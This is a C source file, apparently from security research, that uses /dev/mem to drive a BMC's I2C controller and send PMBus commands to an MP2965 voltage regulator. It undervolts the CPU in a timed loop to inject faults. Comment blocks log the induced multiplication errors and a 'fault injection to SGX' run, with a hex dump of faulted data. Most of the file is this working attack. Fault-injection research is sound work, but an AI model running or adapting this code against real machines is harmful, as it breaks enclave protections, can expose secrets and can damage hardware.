#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <unistd.h>
#include <time.h>

#include "i2c.h"
#include "pmbus.h"
volatile uint8_t *i2c_mem;
volatile I2C_dev_t *i2c_3;

#define VERBOSE

uint32_t readMfrVrConfig(){
	uint32_t res = 0x0;
	res = i2c_smbus_read_data(i2c_3, DEVICE_ADDR, CMD_MFR_VR_CONFIG, 2);
#ifdef VERBOSE
	printf("[%s] RAW DATA: 0x%X\n", __func__, res );

	if ((res & MASK_VID_STEP_SEL) == VID_STEP_5MV){
		printf("[%s] VID STEP: 5mV\n", __func__);
	} else {
		printf("[%s] VID STEP: 10mV\n", __func__);
	}

	if ((res & MASK_OVER_CLOCK1_EN)){
		printf("[%s] OVERCLOCK MODE1 Enabled\n", __func__ );
	}
	if ((res & MASK_OVER_CLOCK2_EN)){
		printf("[%s] OVERCLOCK MODE2 Enabled\n", __func__ );
	}
#endif
	return res;
}

uint32_t setMfrVrConfig(uint32_t data){

	i2c_smbus_write_data(i2c_3, DEVICE_ADDR, CMD_MFR_VR_CONFIG, (uint8_t*)&data, 2);
	return 0;
}

uint32_t readVoutCMD(){
	uint32_t res = 0x0;
	res = i2c_smbus_read_data(i2c_3, DEVICE_ADDR, CMD_VOUT_CMD, 2);

#ifdef VERBOSE
	printf("[%s] RAW DATA: 0x%X\n", __func__, res );
#endif
	return res;

}

void setVoutCMD(uint16_t data){
	i2c_smbus_write_data(i2c_3, DEVICE_ADDR, CMD_VOUT_CMD, (uint8_t*)&data, 2);
}
uint32_t readVoutOffset(){
	uint32_t res = i2c_smbus_read_data(i2c_3, DEVICE_ADDR, CMD_VOUT_OFFSET, 1);
	
#ifdef VERBOSE
	printf("[%s] RAW DATA: 0x%X, Offset %d VIDs\n", __func__, res, res);
#endif
	return res;

}

void setVoutOffset(uint32_t data){
	i2c_smbus_write_data(i2c_3, DEVICE_ADDR, CMD_VOUT_OFFSET, (uint8_t*)&data, 1);

}

uint32_t readVoutMax(){
	uint32_t res = i2c_smbus_read_data(i2c_3, DEVICE_ADDR, CMD_VOUT_MAX, 2);
#ifdef VERBOSE
	printf("[%s] RAW DATA: 0x%X\n", __func__, res);
#endif
	return res;

}
// MP2965 Page 102
uint32_t readMfrLoopPiSet(){

	uint32_t res = i2c_smbus_read_data(i2c_3, DEVICE_ADDR, CMD_MFR_LOOP_PI_SET, 2);
#ifdef VERBOSE
	uint32_t mode = res & MASK_VOUT_PMBUS_LSB;
	printf("[%s] RAW DATA: 0x%X\n", __func__, res);

	switch (mode) {
		case VOUT_FORMAT_VID:
			printf("[%s] %s\n", __func__, "Mode VID format");
			break;
		case VOUT_FORMAT_1MV:
			printf("[%s] %s\n", __func__, "Mode 1mV/LSB");
			break;
		default:
			printf("[%s] %s\n", __func__, "Mode Unknown");
	}
#endif
	return res;
}

uint32_t readOperation(){
	uint32_t res = i2c_smbus_read_data(i2c_3, DEVICE_ADDR, CMD_OPERATION, 1);
	if (res == -1) {
		// ERROR HANDLING: i2c transaction failed
		printf("Failed to read from the i2c bus.\n");
		return -1;
	} else {
		// Convert VID to actual voltage
		printf("[%s] OPERATION: %X\n", __func__, res );
		return res;
	}
}
void setOperation(uint32_t data){
	// Using SMBus commands
	i2c_smbus_write_data(i2c_3, DEVICE_ADDR, CMD_OPERATION, (uint8_t*)&data, 1);
}

uint32_t readVout(){
	uint32_t res = i2c_smbus_read_data(i2c_3, DEVICE_ADDR, CMD_VOUT, 2);
	#ifdef VERBOSE
		printf("[%s] RAW DATA: 0x%X\n", __func__, res);
	#endif
	return res & 0xff;
}



int main(int argc, char *argv[]) {
	i2c_mem = NULL;

	// Should not be a problem if we are using 0x1E78A000
	// System page size should be 0x1000
    const size_t pagesize = sysconf(_SC_PAGE_SIZE);
	printf("pagesize: %d\n", pagesize);
	if (pagesize != 0x1000) 
	{
		printf("Error: page size is not 4k, the code need to be adjusted\n");
		return -1;
	}
	
    // Truncate offset to a multiple of the page size, or mmap will fail.
    // off_t page_base = (I2C_BASE / pagesize) * pagesize;
    // off_t page_offset = offset - page_base;

    int fd = open("/dev/mem", O_RDWR | O_SYNC);
    i2c_mem = mmap(NULL, I2C_MMIO_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, I2C_BASE);
    if (i2c_mem == MAP_FAILED) {
        perror("Can't map memory");
        return -1;
    } else {
		printf("Memory mapped at %p\n", i2c_mem);
	}

	volatile uint32_t *p_g00 = (uint32_t *)(i2c_mem + I2C_G0_OFFSET);
	volatile uint32_t *p_g08 = (uint32_t *)(i2c_mem + I2C_G8_OFFSET);
	// *p_g08 = 0xffffffff;
	*p_g08 = 0x00000000;

	printf("G0: 0x%08x, G8: 0x%08x\n", *p_g00, *p_g08);

	i2c_3 = (I2C_dev_t *)(i2c_mem + I2C_DEV3_OFFSET);
 	print_dev(i2c_3);
	config_dev(i2c_3);

	// I2C Init completed
	//////////////////////////////////////////////////////////

	printf("-------- system info --------\n");
//	dumpregs();
	readVoutMax();
	// readMfrVrConfig2();
	uint32_t voutMode = readMfrLoopPiSet();


	// This will read the voltage from the sensor
	uint32_t vout = readVout();
	float voltage = 0;

	if ((voutMode & MASK_VOUT_PMBUS_LSB) == VOUT_FORMAT_VID){
		voltage =(vout*0.005 +0.245);
		printf("Sensor Voltage: %f\n", voltage );
	}else{
		printf("Error: Unimplemented\n");
	}

	uint32_t offset = readVoutOffset();
	readOperation();

	printf("---------- Start undervolting ---------- \n");

	config_dev(i2c_3);		// Re-configure the device, required
	uint32_t op_temp = readOperation();
	op_temp |= BIT1;
	setOperation(op_temp);

	uint32_t config = readMfrVrConfig();

	// uint8_t volt = 0x70; // 0x70 is the VID when running at 2GHz
	// uint8_t volt = 0x5A;
	// Gradually lower the voltage
	uint8_t volt = 0x69;
	for (int i=0x00; i<0x23; i++){
		printf("Setting vout to 0x%X\n", volt-i);
		config_dev(i2c_3);		// Re-configure the device, required
		setVoutCMD(volt - i );
		usleep(100);
		setMfrVrConfig(0xc3cb);
		// usleep(150);
		usleep(150);
		config_dev(i2c_3);		// Re-configure the device, required
		setVoutCMD(volt);
		usleep(100);
		setMfrVrConfig(config);	// 0xc7c3
		usleep(100);

		setOperation(op_temp & ~BIT1);
		sleep(1);

	}


/*
------   CALCULATION ERROR DETECTED   ------
 > Iterations  	 : 149784461
 > Operand 1   	 : 0000000000ae0000
 > Operand 2   	 : 0000000000000018
 > Correct     	 : 0000000010500000
 > Result      	 : 000000000c500000
 > xor result  	 : 000000001c000000
 > undervoltage	 : 1010409553
 > temperature 	 : +33.0°C
 > Frequency   	 : 2000MHz
*/


/*
Summary
-------------------------------------------------
Iterations:          1000000000
Start Voltage:       -300
End Voltage:         0
Stop after x drops:  500
Voltage steps:       1
Threads:             1
Operand1:            0x0000000000ae0000
Operand2:            0x0000000000000018
Operand1 is:         fixed value
Operand2 is:         fixed value
Operand1 min is:     0x0000000000000000
Operand2 min is:     0x0000000000000000
Multiply only:	     Yes



------   CALCULATION ERROR DETECTED   ------
 > Iterations  	 : 489994753
 > Operand 1   	 : 0000000000ae0000
 > Operand 2   	 : 0000000000000018
 > Correct     	 : 0000000010500000
 > Result      	 : 000000000c500000
 > xor result  	 : 000000001c000000
 > undervoltage	 : -202788783


------ Log for undervolt and fault injection to SGX ----

VoutCMD voltage: 0.865000
[readMfrVrConfig] RAW DATA: 0xC3CB
[readMfrVrConfig] VID STEP: 5mV
[readMfrVrConfig] OVERCLOCK MODE2 Enabled
[readMfrVrConfig] RAW DATA: 0xC3C3
[readMfrVrConfig] VID STEP: 5mV
[readMfrVrConfig] RAW DATA: 0xC3C3
[readMfrVrConfig] VID STEP: 5mV
[readMfrVrConfig] RAW DATA: 0xC3CB
[readMfrVrConfig] VID STEP: 5mV
[readMfrVrConfig] OVERCLOCK MODE2 Enabled
[readVoutCMD] RAW DATA: 0x7B
VoutCMD voltage: 0.860000
[readMfrVrConfig] RAW DATA: 0xC3CB
[readMfrVrConfig] VID STEP: 5mV
[readMfrVrConfig] OVERCLOCK MODE2 Enabled
[readMfrVrConfig] RAW DATA: 0xC3C3
[readMfrVrConfig] VID STEP: 5mV
[readMfrVrConfig] RAW DATA: 0xC3C3
[readMfrVrConfig] VID STEP: 5mV
[readMfrVrConfig] RAW DATA: 0xC3CB
[readMfrVrConfig] VID STEP: 5mV
[readMfrVrConfig] OVERCLOCK MODE2 Enabled
[readVoutCMD] RAW DATA: 0x7A
VoutCMD voltage: 0.855000
[readMfrVrConfig] RAW DATA: 0xC3CB
[readMfrVrConfig] VID STEP: 5mV
[readMfrVrConfig] OVERCLOCK MODE2 Enabled
[readMfrVrConfig] RAW DATA: 0xC3C3
[readMfrVrConfig] VID STEP: 5mV
[readMfrVrConfig] RAW DATA: 0xC3C3
[readMfrVrConfig] VID STEP: 5mV
[readMfrVrConfig] RAW DATA: 0xC3CB
[readMfrVrConfig] VID STEP: 5mV
[readMfrVrConfig] OVERCLOCK MODE2 Enabled
[readVoutCMD] RAW DATA: 0x79
VoutCMD voltage: 0.850000
[readMfrVrConfig] RAW DATA: 0xC3CB
[readMfrVrConfig] VID STEP: 5mV
[readMfrVrConfig] OVERCLOCK MODE2 Enabled
[readMfrVrConfig] RAW DATA: 0xC3C3
[readMfrVrConfig] VID STEP: 5mV
[readMfrVrConfig] RAW DATA: 0xC3C3
[readMfrVrConfig] VID STEP: 5mV
[readMfrVrConfig] RAW DATA: 0xC3CB
[readMfrVrConfig] VID STEP: 5mV
[readMfrVrConfig] OVERCLOCK MODE2 Enabled
[readVoutCMD] RAW DATA: 0x78
VoutCMD voltage: 0.845000
[readMfrVrConfig] RAW DATA: 0xC3CB
[readMfrVrConfig] VID STEP: 5mV
[readMfrVrConfig] OVERCLOCK MODE2 Enabled
[readMfrVrConfig] RAW DATA: 0xC3C3
[readMfrVrConfig] VID STEP: 5mV



0x3f, 0xe0, 0xb8, 0x74, 0x04, 0x18, 0x9c, 0xed, 0x91, 0x1a, 0x02, 0x12, 0x2a, 0xce, 0x89, 0xf8, 0x32, 0x00, 0xdc, 0x05, 0x15, 0x53, 0x72, 0x8d, 0x84, 0x00, 0xd3, 0x67, 0xbe, 0xa1, 0xc2, 0x40, 0x76, 0xbc, 0x8c, 0xd8, 0xfe, 0xb1, 0x00, 0xd7, 0x9e, 0x0e, 0xb6, 0xac, 0x61, 0xc0, 0xec, 0x9c, 0xf7, 0x7e, 0xbc, 0x4b, 0xde, 0x18, 0xa5, 0xa4, 0x1c, 0x74, 0xc4, 0xb5, 0x6a, 0x8d, 0xd3, 0xb1, 0x35, 0xf9, 0xad, 0x0b, 0xe3, 0x4a, 0x01, 0x52, 0xd4, 0xc6, 0xb2, 0x95, 0xbc, 0xdc, 0xad, 0x61, 0x8e, 0x07, 0x84, 0x4d, 0xe3, 0xa7, 0xff, 0xf0, 0xd1, 0xa0, 0xd4, 0x58, 0x9f, 0xbc, 0x37, 0x0b, 0xa8, 0x91, 0x83, 0x15, 0x7b, 0xee, 0x28, 0x83, 0x12, 0x4a, 0x89, 0x61, 0x1e, 0x2c, 0xe1, 0x02, 0x2f, 0x08, 0x4d, 0x5b, 0x04, 0x92, 0x5e, 0x31, 0xd0, 0x7e, 0x94, 0x85, 0xd0, 0xce, 0x75, 0x4a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
Noooo!!!!1111elfoelf
*/

	// Clean up
	close(fd);
    return 0;
}